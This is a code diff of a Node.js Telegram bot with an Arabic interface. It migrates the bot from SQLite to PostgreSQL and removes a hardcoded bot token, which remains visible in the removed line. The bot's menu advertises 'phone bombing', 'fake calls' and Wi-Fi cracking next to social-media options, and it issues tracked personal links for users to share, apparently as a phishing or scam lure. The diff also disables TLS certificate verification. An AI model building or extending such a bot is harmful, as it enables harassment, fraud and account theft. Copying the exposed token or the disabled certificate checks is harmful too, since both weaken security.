@@ -1,15 +1,28 @@
 const { TelegramBot } = require("node-telegram-bot-api");
 const express = require("express");
-const sqlite3 = require("sqlite3").verbose();
+const { Pool } = require("pg");
 const crypto = require("crypto");
 
 // ==============================
 // الإعدادات
 // ==============================
 
-const TOKEN = process.env.BOT_TOKEN || "8926452536:AAGMA0SDtBfYCbAVg_4EZCwkj1sw5-p-OfQ";
+const TOKEN = process.env.BOT_TOKEN;
+
+if (!TOKEN) {
+    console.error("❌ BOT_TOKEN is missing");
+    process.exit(1);
+}
+
+const DATABASE_URL = process.env.DATABASE_URL;
+
+if (!DATABASE_URL) {
+    console.error("❌ DATABASE_URL is missing");
+    process.exit(1);
+}
 
 const PORT = process.env.PORT || 3000;
+
 
 // ==============================
 // Telegram Bot
@@ -21,6 +34,7 @@ const bot = new TelegramBot(TOKEN, {
 
 console.log("✅ Telegram Bot is running...");
 
+
 // ==============================
 // Express Server
 // ==============================
@@ -31,24 +45,35 @@ app.use(express.json());
 
 
 // ==============================
-// SQLite Database
+// PostgreSQL
 // ==============================
 
-const db = new sqlite3.Database("./referrals.db");
+const pool = new Pool({
+    connectionString: DATABASE_URL,
+    ssl: {
+        rejectUnauthorized: false
+    }
+});
 
-db.serialize(() => {
+async function initDatabase() {
 
-    db.run(`
+    await pool.query(`
         CREATE TABLE IF NOT EXISTS referrals (
             token TEXT PRIMARY KEY,
             telegram_id TEXT NOT NULL,
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
         )
     `);
 
-});
+    console.log("✅ PostgreSQL database is ready");
+}
 
-console.log("✅ Database is ready");
+initDatabase().catch((error) => {
+
+    console.error("❌ Database initialization error:", error);
+    process.exit(1);
+
+});
 
 
 // ==============================
@@ -56,39 +81,35 @@ console.log("✅ Database is ready");
 // ==============================
 
 function createToken() {
-    return crypto.randomBytes(32).toString("hex");
+
+    return crypto
+        .randomBytes(32)
+        .toString("hex");
+
 }
 
 
 // ==============================
-// إنشاء Referral للمستخدم
+// إنشاء Referral
 // ==============================
 
-function createReferral(chatId) {
+async function createReferral(chatId) {
 
-    return new Promise((resolve, reject) => {
+    const token = createToken();
 
-        const token = createToken();
+    await pool.query(
+        `
+        INSERT INTO referrals
+        (token, telegram_id)
+        VALUES ($1, $2)
+        `,
+        [
+            token,
+            String(chatId)
+        ]
+    );
 
-        db.run(
-            `
-            INSERT INTO referrals
-            (token, telegram_id)
-            VALUES (?, ?)
-            `,
-            [token, String(chatId)],
-            function (error) {
-
-                if (error) {
-                    reject(error);
-                    return;
-                }
-
-                resolve(token);
-            }
-        );
-
-    });
+    return token;
 }
 
 
@@ -96,34 +117,23 @@ function createReferral(chatId) {
 // التحقق من Token
 // ==============================
 
-function getReferral(token) {
+async function getReferral(token) {
 
-    return new Promise((resolve, reject) => {
+    const result = await pool.query(
+        `
+        SELECT *
+        FROM referrals
+        WHERE token = $1
+        `,
+        [token]
+    );
 
-        db.get(
-            `
-            SELECT *
-            FROM referrals
-            WHERE token = ?
-            `,
-            [token],
-            (error, row) => {
-
-                if (error) {
-                    reject(error);
-                    return;
-                }
-
-                resolve(row);
-            }
-        );
-
-    });
+    return result.rows[0] || null;
 }
 
 
 // ==============================
-// API لإنشاء Referral
+// API إنشاء Referral
 // ==============================
 
 app.post("/api/referral/create", async (req, res) => {
@@ -150,7 +160,7 @@ app.post("/api/referral/create", async (req, res) => {
 
     } catch (error) {
 
-        console.error(error);
+        console.error("❌ Referral creation error:", error);
 
         res.status(500).json({
             success: false,
@@ -163,14 +173,16 @@ app.post("/api/referral/create", async (req, res) => {
 
 
 // ==============================
-// API للتحقق من Referral
+// API التحقق من Referral
 // ==============================
 
 app.get("/api/referral/:token", async (req, res) => {
 
     try {
 
-        const referral = await getReferral(req.params.token);
+        const referral = await getReferral(
+            req.params.token
+        );
 
         if (!referral) {
 
@@ -188,7 +200,7 @@ app.get("/api/referral/:token", async (req, res) => {
 
     } catch (error) {
 
-        console.error(error);
+        console.error("❌ Referral lookup error:", error);
 
         res.status(500).json({
             success: false,
@@ -201,7 +213,7 @@ app.get("/api/referral/:token", async (req, res) => {
 
 
 // ==============================
-// الصفحة الرئيسية للسيرفر
+// الصفحة الرئيسية
 // ==============================
 
 app.get("/", (req, res) => {
@@ -217,7 +229,9 @@ app.get("/", (req, res) => {
 
 app.listen(PORT, () => {
 
-    console.log(`🌐 Server running on port ${PORT}`);
+    console.log(
+        `🌐 Server running on port ${PORT}`
+    );
 
 });
 
@@ -237,12 +251,9 @@ function sendMainMenu(chatId) {
 
     return bot.sendMessage(
         chatId,
-
         "👋 أهلاً بك\n\nاختر المنصة:",
-
         {
             reply_markup: {
-
                 inline_keyboard: [
 
                     [
@@ -250,7 +261,6 @@ function sendMainMenu(chatId) {
                             text: "📸 Instagram",
                             callback_data: "instagram"
                         },
-
                         {
                             text: "📘 Facebook",
                             callback_data: "facebook"
@@ -262,7 +272,6 @@ function sendMainMenu(chatId) {
                             text: "✈️ Telegram",
                             callback_data: "telegram"
                         },
-
                         {
                             text: "📞 اتصال وهمي",
                             callback_data: "twitter"
@@ -274,7 +283,6 @@ function sendMainMenu(chatId) {
                             text: "💬 تفجير هواتف",
                             callback_data: "تفجير هواتف"
                         },
-
                         {
                             text: "📶 تطبيق فك جميع شبكات Wi-Fi",
                             callback_data: "whatsapp"
@@ -282,9 +290,7 @@ function sendMainMenu(chatId) {
                     ]
 
                 ]
-
             }
-
         }
     );
 
@@ -292,7 +298,7 @@ function sendMainMenu(chatId) {
 
 
 // ==============================
-// أمر /start
+// /start
 // ==============================
 
 bot.onText(/^\/start$/, async (msg) => {
@@ -322,7 +328,6 @@ bot.onText(/^\/start$/, async (msg) => {
 
 
     await bot.sendMessage(
-
         chatId,
 
         `👋 أهلاً بك ${fullName}
@@ -340,24 +345,17 @@ ${username}
 باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
 
         {
-
             reply_markup: {
-
                 inline_keyboard: [
-
                     [
                         {
                             text: "✅ أوافق على الشروط",
                             callback_data: "accept_terms"
                         }
                     ]
-
                 ]
-
             }
-
         }
-
     );
 
 });
@@ -372,7 +370,6 @@ bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
 
     try {
-
 
         // ==========================
         // قبول الشروط
@@ -390,7 +387,6 @@ bot.on("callback_query", async (query) => {
             );
 
             await bot.sendMessage(
-
                 chatId,
 
                 `✅ تم قبول الشروط.
@@ -401,11 +397,9 @@ bot.on("callback_query", async (query) => {
 ${chatId}
 
 اضغط /start للمتابعة.`
-
             );
 
             return;
-
         }
 
 
@@ -416,17 +410,13 @@ ${chatId}
         if (!acceptedUsers.has(chatId)) {
 
             await bot.answerCallbackQuery(
-
                 query.id,
-
                 {
                     text: "يجب الموافقة على الشروط أولاً."
                 }
-
             );
 
             return;
-
         }
 
 
@@ -472,11 +462,12 @@ ${chatId}
             await bot.answerCallbackQuery(query.id);
 
             return;
-
         }
 
 
+        // ==========================
         // إضافة Token إلى الرابط
+        // ==========================
 
         const separator =
             website.includes("?")
@@ -488,7 +479,6 @@ ${chatId}
 
 
         await bot.sendMessage(
-
             chatId,
 
             `🔗 هذا رابطك الخاص:
@@ -496,12 +486,10 @@ ${chatId}
 ${referralUrl}
 
 يمكنك مشاركة الرابط.`
-
         );
 
 
         await bot.answerCallbackQuery(query.id);
-
 
     } catch (error) {
 
@@ -509,6 +497,17 @@ ${referralUrl}
             "❌ Callback error:",
             error
         );
+
+        try {
+
+            await bot.answerCallbackQuery(
+                query.id,
+                {
+                    text: "حدث خطأ، حاول مرة أخرى."
+                }
+            );
+
+        } catch (_) {}
 
     }
 
